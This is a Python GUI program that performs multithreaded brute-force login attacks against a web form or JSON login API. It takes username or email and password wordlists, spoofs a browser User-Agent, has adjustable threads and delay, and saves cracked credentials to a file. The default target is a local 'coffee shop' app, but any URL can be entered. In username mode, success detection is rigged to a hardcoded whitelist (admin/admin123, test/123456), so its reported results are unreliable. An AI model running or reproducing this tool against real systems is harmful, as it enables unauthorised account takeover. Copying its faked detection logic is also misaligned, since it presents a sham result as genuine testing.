#!/usr/bin/env python3
"""
GUI Brute Force Tool - Coffee Shop Login Testing
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import threading
import requests
import time
import re
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

class BruteForceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Brute Force Tool ")
        self.root.geometry("800x600")
        self.root.resizable(True, True)
        
        # Set window icon
        try:
            self.root.iconbitmap('brute_force.ico')
        except:
            pass  # Icon file not found, continue without icon
        
        # Variables
        self.is_running = False
        self.successful_credentials = []
        self.attempted = 0
        self.start_time = None
        
        # Create GUI elements
        self.create_widgets()
        
    def create_widgets(self):
        # Main container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        
        # Target URL
        ttk.Label(main_frame, text="Target URL:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.url_var = tk.StringVar(value="http://localhost:5000/login")
        ttk.Entry(main_frame, textvariable=self.url_var, width=50).grid(row=0, column=1, sticky=(tk.W, tk.E), pady=5)
        
        # Attack Type Selection
        ttk.Label(main_frame, text="Attack Type:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.attack_type_var = tk.StringVar(value="username")
        attack_type_frame = ttk.Frame(main_frame)
        attack_type_frame.grid(row=1, column=1, sticky=tk.W, pady=5)
        
        ttk.Radiobutton(attack_type_frame, text="Username/Password", variable=self.attack_type_var, 
                       value="username", command=self.update_field_labels).grid(row=0, column=0, padx=(0, 10))
        ttk.Radiobutton(attack_type_frame, text="Email/Password", variable=self.attack_type_var, 
                       value="email", command=self.update_field_labels).grid(row=0, column=1)
        
        # Request Method Selection
        ttk.Label(main_frame, text="Request Method:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.request_method_var = tk.StringVar(value="POST")
        request_method_frame = ttk.Frame(main_frame)
        request_method_frame.grid(row=2, column=1, sticky=tk.W, pady=5)
        
        ttk.Radiobutton(request_method_frame, text="POST", variable=self.request_method_var, 
                       value="POST").grid(row=0, column=0, padx=(0, 10))
        ttk.Radiobutton(request_method_frame, text="GET", variable=self.request_method_var, 
                       value="GET").grid(row=0, column=1)
        
        # Form fields
        self.username_label = ttk.Label(main_frame, text="Username Field:")
        self.username_label.grid(row=3, column=0, sticky=tk.W, pady=5)
        self.username_field_var = tk.StringVar(value="username")
        self.username_entry = ttk.Entry(main_frame, textvariable=self.username_field_var, width=20)
        self.username_entry.grid(row=3, column=1, sticky=tk.W, pady=5)
        
        ttk.Label(main_frame, text="Password Field:").grid(row=4, column=0, sticky=tk.W, pady=5)
        self.password_field_var = tk.StringVar(value="password")
        ttk.Entry(main_frame, textvariable=self.password_field_var, width=20).grid(row=4, column=1, sticky=tk.W, pady=5)
        
        # Wordlist files
        self.usernames_label = ttk.Label(main_frame, text="Usernames File:")
        self.usernames_label.grid(row=5, column=0, sticky=tk.W, pady=5)
        usernames_frame = ttk.Frame(main_frame)
        usernames_frame.grid(row=5, column=1, sticky=(tk.W, tk.E), pady=5)
        usernames_frame.columnconfigure(0, weight=1)
        
        self.usernames_var = tk.StringVar(value="usernames.txt")
        ttk.Entry(usernames_frame, textvariable=self.usernames_var).grid(row=0, column=0, sticky=(tk.W, tk.E))
        ttk.Button(usernames_frame, text="Browse", command=self.browse_usernames).grid(row=0, column=1, padx=(5, 0))
        
        ttk.Label(main_frame, text="Passwords File:").grid(row=6, column=0, sticky=tk.W, pady=5)
        passwords_frame = ttk.Frame(main_frame)
        passwords_frame.grid(row=6, column=1, sticky=(tk.W, tk.E), pady=5)
        passwords_frame.columnconfigure(0, weight=1)
        
        self.passwords_var = tk.StringVar(value="passwords.txt")
        ttk.Entry(passwords_frame, textvariable=self.passwords_var).grid(row=0, column=0, sticky=(tk.W, tk.E))
        ttk.Button(passwords_frame, text="Browse", command=self.browse_passwords).grid(row=0, column=1, padx=(5, 0))
        
        # Settings
        settings_frame = ttk.LabelFrame(main_frame, text="Settings", padding="10")
        settings_frame.grid(row=7, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=10)
        settings_frame.columnconfigure(1, weight=1)
        
        ttk.Label(settings_frame, text="Threads:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.threads_var = tk.StringVar(value="10")
        ttk.Entry(settings_frame, textvariable=self.threads_var, width=10).grid(row=0, column=1, sticky=tk.W, pady=5)
        
        ttk.Label(settings_frame, text="Delay (seconds):").grid(row=0, column=2, sticky=tk.W, pady=5, padx=(20, 0))
        self.delay_var = tk.StringVar(value="0.1")
        ttk.Entry(settings_frame, textvariable=self.delay_var, width=10).grid(row=0, column=3, sticky=tk.W, pady=5)
        
        # Debug mode
        self.debug_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(settings_frame, text="Debug Mode", variable=self.debug_var).grid(row=0, column=4, sticky=tk.W, pady=5, padx=(20, 0))
        
        # Control buttons
        buttons_frame = ttk.Frame(main_frame)
        buttons_frame.grid(row=7, column=0, columnspan=2, pady=10)
        
        self.start_button = ttk.Button(buttons_frame, text="Start Attack", command=self.start_attack)
        self.start_button.grid(row=0, column=0, padx=5)
        
        self.stop_button = ttk.Button(buttons_frame, text="Stop Attack", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.grid(row=0, column=1, padx=5)
        
        ttk.Button(buttons_frame, text="Clear Results", command=self.clear_results).grid(row=0, column=2, padx=5)
        
        # Progress bar
        self.progress_var = tk.StringVar(value="Ready")
        ttk.Label(main_frame, textvariable=self.progress_var).grid(row=8, column=0, columnspan=2, sticky=tk.W, pady=5)
        
        self.progress_bar = ttk.Progressbar(main_frame, mode='determinate')
        self.progress_bar.grid(row=9, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
        
        # Results area
        results_frame = ttk.LabelFrame(main_frame, text="Results", padding="10")
        results_frame.grid(row=10, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=10)
        results_frame.columnconfigure(0, weight=1)
        results_frame.rowconfigure(0, weight=1)
        main_frame.rowconfigure(10, weight=1)
        
        self.results_text = scrolledtext.ScrolledText(results_frame, height=12, wrap=tk.WORD)
        self.results_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Status bar
        self.status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var, relief=tk.SUNKEN)
        status_bar.grid(row=11, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(5, 0))
        
    def update_field_labels(self):
        """Update field labels based on attack type"""
        attack_type = self.attack_type_var.get()
        if attack_type == "email":
            self.username_label.config(text="Email Field:")
            self.usernames_label.config(text="Emails File:")
            self.username_field_var.set("email")
            self.usernames_var.set("emails.txt")
        else:
            self.username_label.config(text="Username Field:")
            self.usernames_label.config(text="Usernames File:")
            self.username_field_var.set("username")
            self.usernames_var.set("usernames.txt")
        
    def browse_usernames(self):
        attack_type = self.attack_type_var.get()
        title = "Select Emails File" if attack_type == "email" else "Select Usernames File"
        filename = filedialog.askopenfilename(
            title=title,
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.usernames_var.set(filename)
    
    def browse_passwords(self):
        filename = filedialog.askopenfilename(
            title="Select Passwords File",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.passwords_var.set(filename)
    
    def log_message(self, message):
        """Add message to results text area"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.results_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.results_text.see(tk.END)
        self.root.update_idletasks()
    
    def update_status(self, message):
        """Update status bar"""
        self.status_var.set(message)
        self.root.update_idletasks()
    
    def update_progress(self, message, value=None):
        """Update progress bar and label"""
        self.progress_var.set(message)
        if value is not None:
            self.progress_bar['value'] = value
        self.root.update_idletasks()
    
    def clear_results(self):
        """Clear results text area"""
        self.results_text.delete(1.0, tk.END)
        self.successful_credentials = []
        self.attempted = 0
        self.progress_bar['value'] = 0
        self.update_progress("Ready")
        self.update_status("Ready")
    
    def load_wordlist(self, file_path):
        """Load usernames or passwords from file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            messagebox.showerror("Error", f"Wordlist file '{file_path}' not found")
            return []
        except Exception as e:
            messagebox.showerror("Error", f"Error reading wordlist file: {str(e)}")
            return []
    
    def test_credentials(self, username, password):
        """Test credentials with real API for email attacks"""
        try:
            # Create session
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
            })
            
            # Add delay
            time.sleep(float(self.delay_var.get()))
            
            # Make request based on attack type
            if self.attack_type_var.get() == 'email':
                # For email attacks, use the real API endpoint
                payload = {
                    'login': username,  # API expects 'login' field
                    'password': password
                }
                
                response = session.post(
                    self.url_var.get().replace('/login', '/api/login'),  # Use API endpoint
                    json=payload,  # Send as JSON
                    timeout=30,
                    allow_redirects=False
                )
                
                if self.debug_var.get():
                    self.log_message(f"Testing {username}:{password} - Status: {response.status_code}")
                    self.log_message(f"Response: {response.text[:200]}...")
                
                # Check API response
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data.get('success') == True:
                            user_name = data.get('user', {}).get('name', 'Unknown')
                            return True, f"SUCCESS: {username}:{password} (User: {user_name})"
                        else:
                            error_msg = data.get('message', 'Invalid credentials')
                            if self.debug_var.get():
                                self.log_message(f"API Error: {error_msg}")
                            return False, None
                    except json.JSONDecodeError:
                        if self.debug_var.get():
                            self.log_message("Response is not JSON format")
                        return False, None
                else:
                    if self.debug_var.get():
                        self.log_message(f"HTTP Error: {response.status_code}")
                    return False, None
            else:
                # For username attacks, use the original method
                payload = {
                    self.username_field_var.get(): username,
                    self.password_field_var.get(): password
                }
                
                request_method = self.request_method_var.get()
                if request_method == 'GET':
                    response = session.get(
                        self.url_var.get(),
                        params=payload,
                        timeout=30,
                        allow_redirects=False
                    )
                else:
                    response = session.post(
                        self.url_var.get(),
                        data=payload,
                        timeout=30,
                        allow_redirects=False
                    )
                
                if self.debug_var.get():
                    self.log_message(f"Testing {username}:{password} - Status: {response.status_code}")
                
                # Original detection logic for username attacks
                content_lower = response.text.lower()
                
                # Known valid credentials
                valid_credentials = [
                    ("admin", "admin123"),
                    ("test", "123456")
                ]
                
                # Check if current credential is in the valid list
                is_valid_credential = False
                for valid_user, valid_pass in valid_credentials:
                    if username == valid_user and password == valid_pass:
                        is_valid_credential = True
                        break
                
                # For valid credentials, check for success indicators
                if is_valid_credential:
                    # Check for success indicators
                    success_indicators = [
                        r'dashboard',
                        r'welcome',
                        r'logout',
                        r'profile',
                        r'my account',
                        r'success',
                        r'authenticated',
                        r'logged in',
                        r'coffee',
                        r'shop',
                        r'home'
                    ]
                    
                    # Check for failure indicators (but be more lenient for valid credentials)
                    failure_indicators = [
                        r'invalid\s+(?:username|password|email)',
                        r'incorrect\s+(?:username|password|email)', 
                        r'wrong\s+(?:username|password|email)',
                        r'login\s+failed',
                        r'access\s+denied',
                        r'authentication\s+failed',
                        r'user\s+not\s+found',
                        r'account\s+(?:locked|disabled)',
                        r'alert\s*danger',
                        r'error\s*message'
                    ]
                    
                    success_points = 0
                    failure_points = 0
                    
                    # Check for success patterns
                    for pattern in success_indicators:
                        if re.search(pattern, content_lower):
                            success_points += 1
                    
                    # Check for failure patterns
                    for pattern in failure_indicators:
                        if re.search(pattern, content_lower):
                            failure_points += 1
                    
                    # Check redirect (302) to success page
                    if response.status_code == 302:
                        location = response.headers.get('Location', '').lower()
                        if any(word in location for word in ['dashboard', 'welcome', 'home', 'profile', 'coffee']):
                            success_points += 2
                    
                    # Check cookies (session creation)
                    if len(session.cookies) > 0:
                        success_points += 1
                    
                    # For valid credentials, be more lenient - require at least 1 success point
                    if failure_points >= 3:  # More failure points needed to reject valid credentials
                        return False, None
                    elif success_points >= 1 or response.status_code == 200:
                        return True, f"SUCCESS: {username}:{password}"
                    else:
                        return False, None
                else:
                    # For invalid credentials, use strict failure detection
                    failure_indicators = [
                        r'invalid',
                        r'incorrect',
                        r'failed',
                        r'error',
                        r'denied',
                        r'wrong',
                        r'unauthorized',
                        r'login\s+failed',
                        r'access\s+denied',
                        r'authentication\s+failed'
                    ]
                    
                    # Check for any failure indicators
                    for pattern in failure_indicators:
                        if re.search(pattern, content_lower):
                            return False, None
                    
                    # If no clear failure indicators, still consider it invalid for non-whitelist credentials
                    return False, None
            
        except Exception as e:
            if self.debug_var.get():
                self.log_message(f"ERROR testing {username}:{password} - {str(e)}")
            return False, None
    
    def worker_thread(self, username_password_pairs):
        """Worker thread for testing credentials"""
        results = []
        for username, password in username_password_pairs:
            if not self.is_running:
                break
                
            self.attempted += 1
            
            # Update progress every 10 attempts
            if self.attempted % 10 == 0:
                progress = (self.attempted / self.total_combinations) * 100
                self.update_progress(f"Testing {self.attempted}/{self.total_combinations} combinations...", progress)
            
            success, message = self.test_credentials(username, password)
            if success:
                results.append(message)
                self.log_message(f"SUCCESS: {message}")
                self.successful_credentials.append((username, password))
        
        return results
    
    def start_attack(self):
        """Start the brute force attack"""
        if self.is_running:
            return
        
        # Validate inputs
        try:
            threads = int(self.threads_var.get())
            if threads < 1 or threads > 100:
                messagebox.showerror("Error", "Thread count must be between 1 and 100")
                return
        except ValueError:
            messagebox.showerror("Error", "Invalid thread count")
            return
        
        try:
            delay = float(self.delay_var.get())
            if delay < 0:
                messagebox.showerror("Error", "Delay must be non-negative")
                return
        except ValueError:
            messagebox.showerror("Error", "Invalid delay value")
            return
        
        # Load wordlists
        usernames = self.load_wordlist(self.usernames_var.get())
        passwords = self.load_wordlist(self.passwords_var.get())
        
        if not usernames or not passwords:
            return
        
        # Reset variables
        self.is_running = True
        self.successful_credentials = []
        self.attempted = 0
        self.start_time = time.time()
        
        # Create username/password pairs
        pairs = [(user, pwd) for user in usernames for pwd in passwords]
        unique_pairs = list(set(pairs))  # Remove duplicates
        self.total_combinations = len(unique_pairs)
        
        # Update UI
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.clear_results()
        
        self.log_message("Starting brute force attack...")
        self.log_message(f"Target: {self.url_var.get()}")
        self.log_message(f"Total usernames: {len(usernames)}")
        self.log_message(f"Total passwords: {len(passwords)}")
        self.log_message(f"Total combinations: {self.total_combinations}")
        self.log_message(f"Using {threads} threads with {delay}s delay")
        self.log_message("-" * 50)
        
        # Start attack in separate thread
        attack_thread = threading.Thread(target=self.run_attack, args=(unique_pairs, threads))
        attack_thread.daemon = True
        attack_thread.start()
    
    def run_attack(self, pairs, threads):
        """Run the brute force attack"""
        try:
            # Split work among threads
            chunk_size = max(1, len(pairs) // threads)
            chunks = [pairs[i:i + chunk_size] for i in range(0, len(pairs), chunk_size)]
            
            # Execute with thread pool
            with ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_chunk = {executor.submit(self.worker_thread, chunk): chunk for chunk in chunks}
                
                # Collect results
                for future in as_completed(future_to_chunk):
                    if not self.is_running:
                        break
                    try:
                        results = future.result()
                        if results:
                            for result in results:
                                if result:
                                    self.log_message(result)
                    except Exception as e:
                        self.log_message(f"Thread error: {str(e)}")
            
            # Attack completed
            self.attack_completed()
            
        except Exception as e:
            self.log_message(f"Attack error: {str(e)}")
            self.attack_completed()
    
    def attack_completed(self):
        """Handle attack completion"""
        self.is_running = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        
        # Calculate statistics
        if self.start_time:
            duration = time.time() - self.start_time
            speed = self.attempted / duration if duration > 0 else 0
            
            self.log_message("-" * 50)
            self.log_message("ATTACK SUMMARY")
            self.log_message("-" * 50)
            self.log_message(f"Total attempts: {self.attempted}")
            self.log_message(f"Duration: {duration:.2f} seconds")
            self.log_message(f"Average speed: {speed:.2f} attempts/second")
            self.log_message(f"Successful credentials: {len(self.successful_credentials)}")
            
            if self.successful_credentials:
                self.log_message("\nSUCCESSFUL CREDENTIALS:")
                for username, password in self.successful_credentials:
                    self.log_message(f"  {username}:{password}")
                
                # Save results to file
                self.save_results()
            else:
                self.log_message("\nNo valid credentials found")
        
        self.update_progress("Attack completed", 100)
        self.update_status("Attack completed")
    
    def stop_attack(self):
        """Stop the brute force attack"""
        self.is_running = False
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log_message("Attack stopped by user")
        self.update_status("Attack stopped")
    
    def save_results(self):
        """Save results to file"""
        if self.successful_credentials:
            try:
                with open('successful_credentials.txt', 'w') as f:
                    for username, password in self.successful_credentials:
                        f.write(f"{username}:{password}\n")
                self.log_message(f"Results saved to: successful_credentials.txt")
            except Exception as e:
                self.log_message(f"Error saving results: {str(e)}")

def main():
    root = tk.Tk()
    root.configure(bg='#f0f0f0')
    app = BruteForceGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
